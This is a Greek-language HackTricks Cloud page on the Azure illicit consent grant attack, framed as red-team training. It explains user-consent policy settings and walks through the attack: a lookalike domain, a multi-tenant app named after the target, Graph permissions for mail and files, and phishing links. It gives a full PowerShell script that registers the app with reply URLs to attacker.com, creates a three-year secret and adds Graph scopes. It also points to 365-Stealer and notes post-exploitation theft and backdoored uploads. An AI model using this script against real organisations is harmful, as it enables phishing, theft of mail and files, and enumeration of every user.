# Az - Παράνομη Χορήγηση Συναίνεσης

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Απάτη OAuth App

Οι **εφαρμογές Azure** ζητούν άδεια για να έχουν πρόσβαση στα **δεδομένα του χρήστη** (βασικές πληροφορίες, αλλά και πρόσβαση σε έγγραφα, αποστολή email...).\
Εάν **επιτραπεί**, ένας κανονικός χρήστης μπορεί να δώσει συναίνεση μόνο για **"χαμηλή επίδραση" άδειες**. Σε **όλες τις άλλες** περιπτώσεις, απαιτείται **συναίνεση διαχειριστή**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` και ένα προσαρμοσμένο ρόλο που περιλαμβάνει `άδεια για χορήγηση άδειας σε εφαρμογές` μπορούν να παρέχουν συναίνεση για ολόκληρο τον οργανισμό.

Μόνο οι άδειες που **δεν απαιτούν συναίνεση διαχειριστή** κατατάσσονται ως **χαμηλή επίδραση**. Αυτές είναι οι άδειες που απαιτούνται για τη **βασική σύνδεση είναι openid, profile, email, User.Read και offline\_access**. Εάν μια **οργάνωση** επιτρέπει τη συναίνεση του χρήστη για **όλες τις εφαρμογές**, ένας υπάλληλος μπορεί να δώσει συναίνεση σε μια εφαρμογή για να **διαβάσει τα παραπάνω από το προφίλ του**.

<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

Έτσι, ένας επιτιθέμενος μπορεί να προετοιμάσει μια **κακόβουλη εφαρμογή** και με μια **απάτη**, να κάνει τον χρήστη να **αποδεχτεί την εφαρμογή και να κλέψει τα δεδομένα του**.

### Έλεγχος εάν οι χρήστες έχουν δώσει συναίνεση

Το παρακάτω εντολή PowerShell χρησιμοποιείται για να ελέγξει τη διαμόρφωση της συναίνεσης για τους χρήστες στο Azure Active Directory (Azure AD) όσον αφορά τη δυνατότητά τους να δώσουν συναίνεση σε εφαρμογές:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **Απενεργοποίηση συγκατάθεσης χρήστη**: Αυτή η ρύθμιση απαγορεύει στους χρήστες να χορηγούν άδειες σε εφαρμογές. Δεν επιτρέπεται η συγκατάθεση των χρηστών σε εφαρμογές.
* **Οι χρήστες μπορούν να συναινέσουν σε εφαρμογές από επαληθευμένους εκδότες ή τον οργανισμό σας, αλλά μόνο για τις επιλεγμένες άδειες που επιλέγετε**: Αυτή η ρύθμιση επιτρέπει σε όλους τους χρήστες να συναινούν μόνο σε εφαρμογές που έχουν δημοσιευτεί από έναν επαληθευμένο εκδότη και εφαρμογές που έχουν καταχωρηθεί στον δικό σας tenant. Προσθέτει ένα επίπεδο ελέγχου επιτρέποντας τη συγκατάθεση μόνο για συγκεκριμένες άδειες.
* **Οι χρήστες μπορούν να συναινέσουν σε όλες τις εφαρμογές**: Αυτή η ρύθμιση είναι πιο επιεικής και επιτρέπει σε όλους τους χρήστες να συναινούν σε οποιεσδήποτε άδειες για εφαρμογές, εφόσον αυτές οι άδειες δεν απαιτούν διαχειριστική συγκατάθεση.
* **Προσαρμοσμένη πολιτική συγκατάθεσης εφαρμογής**: Αυτή η ρύθμιση υποδεικνύει ότι υπάρχει μια προσαρμοσμένη πολιτική σε ισχύ, η οποία μπορεί να προσαρμοστεί στις συγκεκριμένες απαιτήσεις του οργανισμού και μπορεί να περιλαμβάνει συνδυασμό περιορισμών βάσει του εκδότη της εφαρμογής, των άδειων που ζητά η εφαρμογή και άλλων παραγόντων.


## **Κατανόηση Επίθεσης Παράνομης Χορήγησης Συγκατάθεσης**

Σε μια επίθεση παράνομης χορήγησης συγκατάθεσης, οι επιτιθέμενοι εξαπατούν τους τελικούς χρήστες να χορηγήσουν άδειες σε μια κακόβουλη εφαρμογή που έχει καταχωρηθεί στο Azure. Αυτό γίνεται κάνοντας την εφαρμογή να φαίνεται νόμιμη, οδηγώντας τα θύματα να κάνουν κλικ σε ένα κουμπί "Αποδοχή". Ως αποτέλεσμα, το Azure AD εκδίδει ένα διακριτικό στον ιστότοπο του επιτιθέμενου, επιτρέποντάς του να έχει πρόσβαση και να παρεμβαίνει στα δεδομένα του θύματος, όπως ανάγνωση ή αποστολή email και πρόσβαση σε αρχεία, χωρίς να χρειάζεται ένας οργανιστικός λογαριασμός.

## **Επισκόπηση Ροής Επίθεσης**

Η επίθεση περιλαμβάνει αρκετά βήματα που στοχεύουν μια γενική εταιρεία. Ας δούμε πώς μπορεί να εξελιχθεί:

1. **Καταχώρηση Τομέα και Φιλοξενία Εφαρμογής**: Ο επιτιθέμενος καταχωρεί έναν τομέα που μοιάζει με ένα αξιόπιστο ιστότοπο, για παράδειγμα, "safedomainlogin.com". Υπό αυτόν τον τομέα, δημιουργείται ένα υποτομέας (π.χ. "companyname.safedomainlogin.com") για να φιλοξενήσει μια εφαρμογή που έχει σχεδιαστεί για την καταγραφή κωδικών εξουσιοδότησης και την αίτηση διακριτικών πρόσβασης.

2. **Καταχώρηση Εφαρμογής στο Azure AD**: Ο επιτιθέμενος καταχωρεί ένα πολυ-ενοικιαζόμενο Εφαρμογή στον δικό του Azure AD Tenant, δίνοντάς της το όνομα της εταιρείας-στόχου για να φαίνεται νόμιμη. Διαμορφώνει το URL Ανακατεύθυνσης της εφαρμογής για να δείχνει στον υποτομέα που φιλοξενεί την κακόβουλη εφαρμογή.

3. **Ρύθμιση Άδειας**: Ο επιτιθέμενος ρυθμίζει την εφαρμογή με διάφορες άδειες API (π.χ. `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`). Αυτές οι άδειες, αφού χορηγηθούν από τον χρήστη, επιτρέπουν στον επιτιθέμενο να αντλήσει ευαίσθητες πληροφορίες εξ ονόματος του χρήστη.

4. **Διανομή Κακόβουλων Συνδέσμων**: Ο επιτιθέμενος δημιουργεί έναν σύνδεσμο που περιέχει το αναγνωριστικό πελάτη της κακόβουλης εφαρμογής και τον μοιράζεται με στοχευμένους χρήστες, εξαπατώντας τους να χορηγήσουν συγκατάθεση.

## **Χρήση Εργαλείων για την Επίθεση**

Η επίθεση μπορεί να διευκολυνθεί χρησιμοποιώντας εργαλεία όπως το [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer).

### Προετοιμασία πριν από την Επίθεση:
Εάν ο επιτιθέμενος έχει κάποιο επίπεδο πρόσβασης σε έναν χρήστη του οργανισμού-θύματος, μπορεί να ελέγξει εάν η πολιτική του οργανισμού επιτρέπει στον χρήστη να αποδεχθεί εφαρμογές:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
Για να εκτελέσει την επίθεση, ο επιτιθέμενος θα χρειαστεί να δημιουργήσει μια **νέα εφαρμογή στο Azure Tenant του** (στις εγγραφές εφαρμογών), παραμετροποιημένη με τις άδειες:

<figure><img src="../../../.gitbook/assets/image (2) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Το `User.ReadBasic.All` βρίσκεται μέσα στο `Microsoft Graph` στις `Delegated permissions`. (Οι εφαρμογές πάντα θα χρειαστούν επιπλέον έγκριση για τις δικαιώματα εφαρμογής).

* Το `User.ReadBasic.All` είναι η άδεια που θα σας επιτρέψει να **διαβάσετε πληροφορίες όλων των χρηστών** στον οργανισμό αν την εγκρίνετε.
* Θυμηθείτε ότι μόνο οι ρόλοι `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` και ένας προσαρμοσμένος ρόλος που περιλαμβάνει την `άδεια για τη χορήγηση δικαιωμάτων σε εφαρμογές` μπορούν να παράσχουν συναίνεση για ολόκληρο τον Tenant. Έτσι, θα πρέπει να **αποστείλετε ψαρέματα σε έναν χρήστη με έναν από αυτούς τους ρόλους** αν θέλετε να εγκρίνει μια **εφαρμογή που απαιτεί διαχειριστική συναίνεση**.

Μπορείτε επίσης να δημιουργήσετε μια εφαρμογή μέσω του cli με:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

Ελέγξτε [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) για να μάθετε πώς να το ρυθμίσετε.

{% hint style="warning" %}
Σημειώστε ότι το ληφθέν **access token** θα είναι για το **graph endpoint** με τις εξουσίες: `User.Read` και `User.ReadBasic.All` (οι ζητούμενες άδειες). Δεν θα μπορείτε να εκτελέσετε άλλες ενέργειες (αλλά αυτές είναι αρκετές για να **κατεβάσετε πληροφορίες για όλους τους χρήστες** στον οργανισμό).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

Μπορείτε επίσης να χρησιμοποιήσετε αυτό το εργαλείο για να εκτελέσετε αυτήν την επίθεση.

## Μετά την εκμετάλλευση

Αφού αποκτήσετε πρόσβαση στον χρήστη, μπορείτε να κάνετε πράγματα όπως να κλέψετε ευαίσθητα έγγραφα και ακόμα και να ανεβάσετε έγγραφα με προσβεβλημένο πίσω πόρτας.

## Αναφορές

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
